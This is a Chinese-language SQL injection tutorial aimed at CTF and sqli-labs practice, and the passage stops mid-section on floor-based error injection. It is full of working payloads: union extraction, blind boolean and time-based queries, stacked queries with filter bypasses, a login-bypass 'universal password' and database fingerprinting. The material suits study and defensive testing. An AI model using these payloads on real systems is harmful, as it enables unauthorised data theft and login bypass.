<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> and <span class="title function_">if</span> <span class="params">((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">100</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)</span> # <span class="comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span></span><br></pre></td></tr></table></figure></div>

<h2 id="三、判断注入点"><a href="#三、判断注入点" class="headerlink" title="三、判断注入点"></a>三、判断注入点</h2><h3 id="3-1判断是否存在SQL注入漏洞"><a href="#3-1判断是否存在SQL注入漏洞" class="headerlink" title="3.1判断是否存在SQL注入漏洞"></a>3.1判断是否存在SQL注入漏洞</h3><p>输入<code>1&#39;</code>如果报错，则存在注入漏洞，报错原因是单引号数量不匹配，如果没报错，说明可能该网页过滤了单引号</p>
<h3 id="3-2判断是字符型还是整数型"><a href="#3-2判断是字符型还是整数型" class="headerlink" title="3.2判断是字符型还是整数型"></a>3.2判断是字符型还是整数型</h3><ul>
<li>输入<code>1 and 1=2</code>和<code>1&#39;#</code>和<code>1&#39; and &#39;1&#39;=&#39;1</code>若都回显id为1的信息,则为字符型</li>
<li>输入<code>1 and 1=2</code>没有回显，且输入<code>1 and 1=1</code>有回显，则为数字型,原因<code>1 and 1=2</code>恒为假，过滤掉所有的行</li>
</ul>
<h3 id="3-3判断能否时间盲注"><a href="#3-3判断能否时间盲注" class="headerlink" title="3.3判断能否时间盲注"></a>3.3判断能否时间盲注</h3><table>
<thead>
<tr>
<th align="left">MySQL</th>
<th align="left">benchmark(100000000,md(5))sleep(3)</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PostgreSQL</td>
<td align="left">PG_sleep(5)Generate_series(1,1000000)</td>
</tr>
<tr>
<td align="left">SQLServer</td>
<td align="left">waitfor delay ‘0:0:5’</td>
</tr>
</tbody></table>
<h3 id="3-4判断数据库类型"><a href="#3-4判断数据库类型" class="headerlink" title="3.4判断数据库类型"></a>3.4判断数据库类型</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> information_schema.tables) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 access数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> sysobjects) #</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是Oracle数据库<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure></div>

<h2 id="四、常用函数、基础知识"><a href="#四、常用函数、基础知识" class="headerlink" title="四、常用函数、基础知识"></a>四、常用函数、基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul>
<li>system_user()——系统用户名 </li>
<li>user()——用户名 </li>
<li>current_user()——当前用户名 </li>
<li>session_user()——链接数据库的用户名 </li>
<li>database()——数据库名 </li>
<li>version()——数据库版本 </li>
<li>@@datadir——数据库路径 </li>
<li>@@basedir——数据库安装路径 </li>
<li>@@version_conpile_os——操作系统</li>
</ul>
<h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul>
<li>concat(str1,str2,…)——没有分隔符地连接字符串 </li>
<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 </li>
<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li>
</ul>
<h3 id="两种注释"><a href="#两种注释" class="headerlink" title="两种注释"></a>两种注释</h3><ul>
<li>–+</li>
<li><code>#</code>(url编码%23)</li>
</ul>
<h3 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h3><p>万能密码构造</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>’admin’ andpassword<span class="operator">=</span>’’<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在sql中and运算符优先级大于or运算符，类比&amp;&amp;&gt;||</p>
</blockquote>
<p>sql中也能使用位运算</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>&amp;的优先级大于&#x3D;</p>
</blockquote>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 字段 [<span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>]; # <span class="keyword">asc</span>升序，默认的</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>用于判断列数，不知道列名时用1 2 3……表示第1 2 3……列</p>
</blockquote>
<h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p>mysql版本&gt;&#x3D;5.0</p>
<p>该库中有三个表schemata(各数据库名schema_name)、tables(各表名table_name)、columns(各列名)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata # 查数据库名</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #查表名</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #查列名 </span><br></pre></td></tr></table></figure></div>

<h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
<ul>
<li><p>数字类型的注入</p>
</li>
<li><p>字符串类型的注入</p>
</li>
<li><p>搜索型注入</p>
</li>
</ul>
<p><strong>依据提交方式分类</strong></p>
<ul>
<li><p>GET注入</p>
</li>
<li><p>POST注入</p>
</li>
<li><p>COOKIE注入</p>
</li>
<li><p>HTTP头注入(XFF注入、UA注入、REFERER注入）</p>
</li>
</ul>
<p><strong>依据获取信息的方式分类</strong></p>
<ul>
<li><p>基于布尔的盲注</p>
</li>
<li><p>基于时间的盲注</p>
</li>
<li><p>基于报错的注入</p>
</li>
<li><p>联合查询注入</p>
</li>
<li><p>堆叠注入 (可同时执行多条语句)</p>
</li>
</ul>
<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>要求列数一致</p>
<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>整型的也差不多，去掉’</p>
<p>部分题目也可能在字符型基础上加括号等,若注释被屏蔽</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> …… <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>多条sql语句一起执行,利用加<code>;</code>的操作</p>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持，权限不足等</p>
<h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><p>可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables; #查看所有表</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `表名`; #看列</span><br><span class="line">RENAME <span class="keyword">TABLE</span> `words` <span class="keyword">TO</span> `words1`; #改名为words1</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>;#将新words表的列flag改为id</span><br></pre></td></tr></table></figure></div>

<h3 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h3><p>过滤select时，使用handler语句（mysql专用语句）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> hd; #指定数据表users进行载入并将返回句柄重命名为hd</span><br><span class="line">handler hd read <span class="keyword">first</span>; #读取指定表<span class="operator">/</span>句柄的首行数据</span><br><span class="line">handler hd read next; #读取指定表<span class="operator">/</span>句柄的下一行数据</span><br><span class="line">handler hd <span class="keyword">close</span>; #关闭句柄</span><br></pre></td></tr></table></figure></div>

<p>预处理</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> xxx <span class="keyword">from</span> &quot;sql语句&quot;;</span><br><span class="line"><span class="keyword">execute</span> xxx;</span><br><span class="line">#由于<span class="keyword">sql</span>语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤</span><br><span class="line">#比如过滤了<span class="keyword">select</span></span><br><span class="line"><span class="keyword">PREPARE</span> st <span class="keyword">from</span> concat(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="keyword">EXECUTE</span> st;#</span><br></pre></td></tr></table></figure></div>

<p>例题：强网杯随便注</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><ul>
<li><p>mid(): <code>mid(s,n,len);</code> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p>
</li>
<li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> 从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
</li>
<li><p>left(): <code>left(s,n);</code> 返回字符串 s 的前 n 个字符</p>
</li>
<li><p>right(): <code>right(s,n);</code> 返回字符串 s 的后 n 个字符</p>
</li>
<li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> 返回字符串 s 的第一个字符的 ASCII 码。 这里不考虑多字节字符，比如汉字</p>
</li>
<li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p>
<ul>
<li><code>ltrim(s);</code> 去掉字符串s开始处的空格 </li>
<li><code>rtrim(s);</code> 去掉字符串s结尾处的空格 </li>
<li><code>trim(s);</code> 去掉字符串开始和结尾处的空格</li>
</ul>
<blockquote>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TRIM</span>([<span class="keyword">BOTH</span><span class="operator">/</span><span class="keyword">LEADING</span><span class="operator">/</span><span class="keyword">TRAILING</span>] 目标字符串 <span class="keyword">FROM</span> 源字符串);</span><br><span class="line"><span class="keyword">BOTH</span>删除两边的指定字符串 </span><br><span class="line"><span class="keyword">LEADING</span>删除左边的指定字符串 </span><br><span class="line">TARILING删除右边的指定字符串</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;) <span class="operator">=</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> &quot;abcd&quot;);</span><br></pre></td></tr></table></figure></div>

<p>以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b 当这个结果返回0时(说明有一个成功匹配)，则第一个字符是a或者b。 </p>
<p>接着让a的ASCII+2变成c，如果返回1(bc都不匹配)，则字符串第一位为a，反之第一位为b。</p>
<p>这样做的目的是为了方便写脚本 第二个字符判断 select trim(LEADING “aa” from “abcd”) &#x3D; trim(LEADING “ab” from “abcd”); 接着重复上面的过程，判断第二个字符 以此推出整个字符串</p>
<p>如果&#x3D;用regexp替代那么正确的字符一定在regexp前面以这个abcd为例 Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’) 就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1 因此只需判断第一步即可，而不需要ASCII+2去判断了 </p>
<p>⚠️：如果用regexp，要先在<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>的条件下，因为两个相同字符串间的regexp也会返回1</p>
<p>注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;)); <span class="comment">-- cd </span></span><br></pre></td></tr></table></figure></div>

<p>先截断a，返回字符串bcd，在截断b，返回字符串cd</p>
</blockquote>
</li>
<li><p>Insert()</p>
<blockquote>
<p><code>INSERT(s1,x,len,s2)</code> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">例子：第一步删除起始的前x位</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：abcdef</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：bcdef</span></span><br><span class="line">第二步套娃删除x<span class="operator">+</span><span class="number">1</span>位以后的所有</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：a</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- 输出：b</span></span><br></pre></td></tr></table></figure></div></blockquote>
</li>
</ul>
<h3 id="盲注常用方法"><a href="#盲注常用方法" class="headerlink" title="盲注常用方法"></a>盲注常用方法</h3><ul>
<li><p>if&#x2F;case 用在select查询当中，当做一种条件来进行判断</p>
<blockquote>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(条件,为真结果,为假结果)</span><br><span class="line"># <span class="keyword">case</span>语法（两种）</span><br><span class="line">简单函数 </span><br><span class="line"><span class="keyword">CASE</span> [col_name] <span class="keyword">WHEN</span> [value1] <span class="keyword">THEN</span> [result1]…<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line">搜索函数 </span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> [expr] <span class="keyword">THEN</span> [result1]…<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span>  <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">12</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="number">3</span><span class="operator">&lt;</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">3</span> <span class="keyword">then</span> <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>搜索函数优先匹配第一个为真的条件,也可以只写一个条件，代替if语句</p>
</blockquote>
</li>
<li><p>regexp&#x2F;rlike 正则表达式注入（可以代替if）</p>
<blockquote>
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(if((<span class="keyword">user</span>() regexp <span class="string">&#x27;^r&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">user</span>() regexp<span class="string">&#x27;^ri&#x27;</span>); # i表示不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p> 这里只要更换regexp表达式即可</p>
<p> <figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032231275.jpg"
                      alt="image-20220708162044974"
                ><figcaption>image-20220708162044974</figcaption></figure></p>
<p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p>
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">binary</span> database() regexp &quot;^CTF&quot;;</span><br></pre></td></tr></table></figure></div>
</blockquote>
</li>
<li><p>like匹配注入(适用于&#x3D;被过滤)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;ro%&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>benchmark函数 测试操作性能</p>
</li>
<li><p>get_lock</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>第一个连接</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>打开另一个cmd  再次连接mysql，执行get_lock，发现延时</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用mysql_pconnect(打开一个到 MySQL 服务器的持久连接)函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p>
</blockquote>
</li>
</ul>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"># sleep延时</span><br><span class="line"><span class="keyword">select</span> sleep(find_in_set(mid(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# 在<span class="number">0</span><span class="number">-9.</span>中找版本号第一位</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>sleep函数延时不常用，时间可能因网速影响</p>
</blockquote>
<p>利用BENCHMARK()进行延时注入 </p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="keyword">UNION</span> <span class="keyword">SELECT</span> (IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="keyword">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1<span class="comment">--+</span></span><br><span class="line"># 当结果正确的时候，运行ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)操作<span class="number">50000000</span> 次，会占用一段时间。</span><br></pre></td></tr></table></figure></div>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错盲注–floor报错"><a href="#报错盲注–floor报错" class="headerlink" title="报错盲注–floor报错"></a>报错盲注–floor报错</h3><p><u>适用于低版本，mysql8似乎被修复</u></p>
<p>floor报错注入是利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p>
<h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><ul>
<li>rand() 是一个随机函数(产生0到1间随机浮点数),直接使用每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：这样每次产生的值都是一样的。</li>
<li>floor(rand(0)*2） floor()是向下取整，这样可以得到只含0 1的伪随机序列</li>
